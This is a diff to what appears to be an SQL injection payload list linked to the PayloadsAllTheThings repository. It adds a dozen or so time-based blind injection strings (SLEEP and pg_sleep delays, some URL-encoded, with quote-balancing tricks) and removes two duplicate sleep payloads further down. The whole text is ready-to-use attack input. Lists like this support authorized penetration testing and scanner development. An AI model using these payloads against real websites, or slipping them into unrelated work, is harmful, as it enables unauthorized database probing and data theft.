@@ -5,8 +5,17 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 ```
 
 ```
-,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+%2c(select*from(select(sleep(20)))a)
+(SELECT * FROM (SELECT(SLEEP(15)))a)
+AND (SELECT * FROM (SELECT(SLEEP(15)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT 8327 FROM (SELECT(SLEEP(5)))yrDl)
+' AND (SELECT -9789) OR 6323=6323# FROM (SELECT(SLEEP(5)))Xeps) AND 'HlBp'='HlBp
+' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg
+%20AND%20SLEEP(15)%23
 ';SELECT 1;SELECT pg_sleep\(30\);--'
+AND SLEEP(15)
+
 ```
 
 ```
@@ -98,8 +107,6 @@ ORDER BY SLEEP(15)
 ';WAITFOR DELAY '0:0:30'--
 '+WAITFOR+DELAY+'0:0:10'--+-"
 
-(select * from (select(sleep(10)))a)
-%2c(select%20*%20from%20(select(sleep(10)))a)
 '+(select*from(select(sleep(7*7)))a)+'
  OR 3=3 AND ('W' LIKE 'Y
 AND (SELECT * FROM (SELECT(SLEEP(15)))bAKL) AND 'vRxe'='vRxe
